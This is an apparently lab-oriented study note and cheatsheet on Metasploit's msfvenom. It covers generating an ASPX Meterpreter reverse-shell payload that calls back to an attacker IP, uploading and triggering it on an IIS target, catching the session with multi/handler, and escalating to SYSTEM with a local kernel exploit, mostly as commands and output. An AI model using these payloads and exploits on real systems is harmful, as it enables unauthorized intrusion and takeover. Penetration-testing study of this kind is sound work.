# Metasploit — MSFVenom

## Overview

`msfvenom` is Metasploit’s payload generation tool.

It replaced:

- `msfpayload`
- `msfencode`

It is used to generate payloads that can be:

- uploaded to a target
- triggered through a web service
- embedded into files or scripts
- used with `multi/handler`
- paired with Metasploit post-exploitation workflows

Typical use cases:

- reverse shells
- Meterpreter payloads
- web payloads (`.php`, `.aspx`, `.war`)
- executable payloads (`.exe`, `.elf`)
- scripted payloads for staging access

---

# 1. Where MSFVenom Fits in the Workflow

Typical Metasploit workflow with MSFVenom:

1. identify a file upload or execution path
2. generate payload with `msfvenom`
3. place payload on target
4. start `multi/handler`
5. trigger payload
6. catch session
7. escalate privileges / post-exploit

---

# 2. Example Scenario

Suppose target exposes:

- FTP on `21`
- web service on `80`

And:

- FTP allows upload
- uploaded files are served via web root
- web service executes ASPX

That means a web payload can be:

1. generated with MSFVenom
2. uploaded over FTP
3. triggered in browser
4. caught in Metasploit

---

# 3. Enumerating the Target

Example:

```bash
nmap -sV -T4 -p- 10.10.10.5
```

Example result:

```text
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
```

This strongly suggests:

- Windows target
- IIS web server
- `.aspx` payload may work

---

# 4. Generate an ASPX Meterpreter Payload

## Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

---

## Breakdown

| Part | Purpose |
|------|---------|
| `-p windows/meterpreter/reverse_tcp` | staged Windows Meterpreter reverse TCP payload |
| `LHOST=10.10.14.5` | attacker callback IP |
| `LPORT=1337` | attacker callback port |
| `-f aspx` | output as ASPX |
| `> reverse_shell.aspx` | save payload to file |

---

## Example Output

```text
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

---

# 5. Upload and Trigger the Payload

## Upload Path

In this scenario, payload is uploaded through FTP.

Then trigger it by browsing to:

```text
http://10.10.10.5/reverse_shell.aspx
```

If payload file contains no visible HTML, the browser may appear blank.  
That is normal — payload can still execute in the background.

---

# 6. Start the Listener with multi/handler

Before triggering the payload, start Metasploit’s handler.

## Launch msfconsole

```bash
msfconsole -q
```

## Select Handler

```bash
use multi/handler
```

## Configure Listener

```bash
set LHOST 10.10.14.5
set LPORT 1337
```

## Run

```bash
run
```

Expected:

```text
[*] Started reverse TCP handler on 10.10.14.5:1337
```

---

# 7. Catching the Meterpreter Session

After triggering the ASPX payload, handler should receive:

```text
[*] Sending stage ...
[*] Meterpreter session 1 opened ...
```

Example:

```bash
getuid
```

Output:

```text
Server username: IIS APPPOOL\Web
```

This confirms:

- payload executed
- Meterpreter session opened
- context is low-privileged IIS worker identity

---

# 8. If the Session Dies

Example:

```text
[*] Meterpreter session 1 closed. Reason: Died
```

Possible reasons:

- AV / EDR interference
- unstable target process
- staged payload issue
- bad runtime context
- architecture mismatch
- web process recycling

---

## Practical Response

Try:

- different payload type
- different port
- stageless payload
- alternate output format
- another exploit path
- privilege escalation quickly before instability worsens

---

# 9. Local Exploit Suggester

Once you have a Meterpreter session, a useful next step is:

```bash
search local exploit suggester
```

Select:

```bash
use post/multi/recon/local_exploit_suggester
```

Set session:

```bash
set SESSION 2
```

Run:

```bash
run
```

This checks the target against known local privilege escalation paths.

---

## Example Results

You may see suggestions such as:

```text
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/ms10_015_kitrap0d
exploit/windows/local/ms10_092_schelevator
exploit/windows/local/ms16_075_reflection
```

These are **candidate** privilege escalation paths, not guarantees.

---

# 10. Example Local Privilege Escalation

Search for suggested exploit:

```bash
search kitrap0d
```

Select:

```bash
use exploit/windows/local/ms10_015_kitrap0d
```

---

## Configure

```bash
set SESSION 3
set LPORT 1338
```

Then run:

```bash
run
```

Expected output may include:

```text
[*] Started reverse TCP handler ...
[*] Injecting exploit ...
[*] Meterpreter session 4 opened ...
```

Check privileges:

```bash
getuid
```

Expected:

```text
Server username: NT AUTHORITY\SYSTEM
```

---

# 11. Why This Matters

MSFVenom is not just “generate payload and hope”.

In Metasploit workflow it is often:

- payload generation
- listener preparation
- session catch
- session management
- local exploit suggestion
- privilege escalation
- post-exploitation

So think of MSFVenom as the **payload factory** inside a bigger exploitation chain.

---

# 12. Common Output Formats

Useful MSFVenom formats in Metasploit workflows:

| Format | Use Case |
|--------|----------|
| `exe` | Windows executable |
| `elf` | Linux executable |
| `aspx` | IIS / ASP.NET web payload |
| `php` | PHP web payload |
| `war` | Java app server |
| `psh` | PowerShell payload |
| `raw` | raw shellcode |

List formats:

```bash
msfvenom -l formats
```

---

# 13. Common Payload Choices

| Payload | Use |
|--------|-----|
| `windows/meterpreter/reverse_tcp` | staged Meterpreter |
| `windows/meterpreter_reverse_tcp` | stageless Meterpreter |
| `windows/shell_reverse_tcp` | simple reverse shell |
| `windows/x64/meterpreter/reverse_https` | HTTPS Meterpreter |
| `php/meterpreter/reverse_tcp` | PHP Meterpreter |
| `linux/x64/shell_reverse_tcp` | Linux reverse shell |

List payloads:

```bash
msfvenom -l payloads
```

---

# 14. Typical Metasploit + MSFVenom Workflow

## Generate payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

## Start handler

```bash
msfconsole -q
use multi/handler
set LHOST 10.10.14.5
set LPORT 1337
run
```

## Trigger payload

Browse to:

```text
http://10.10.10.5/reverse_shell.aspx
```

## Interact with session

```bash
sessions
sessions -i 1
getuid
sysinfo
```

## Suggest privesc

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

# 15. Key Takeaways

- `msfvenom` generates payloads; `multi/handler` catches them
- match payload format to reachable execution vector
- for IIS, `-f aspx` is often useful
- staged Meterpreter may be unstable in some cases
- once a session lands, move quickly into enumeration and privilege escalation
- `local_exploit_suggester` is an excellent follow-up on Windows sessions

---

# Cheatsheet

## Generate ASPX Meterpreter payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

## Launch handler

```bash
msfconsole -q
use multi/handler
set LHOST 10.10.14.5
set LPORT 1337
run
```

## Session management

```bash
sessions
sessions -i 1
getuid
sysinfo
```

## Local exploit suggester

```bash
search local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

## Example privesc follow-up

```bash
search kitrap0d
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LPORT 1338
run
```

---

# Related Notes

- Metasploit payloads
- Meterpreter commands
- sessions & jobs
- msfvenom (shells & payloads section)
- local privilege escalation
- multi/handler

---

# Tags

#metasploit #msfvenom #meterpreter #multi-handler #payloads #windows #privesc #oscp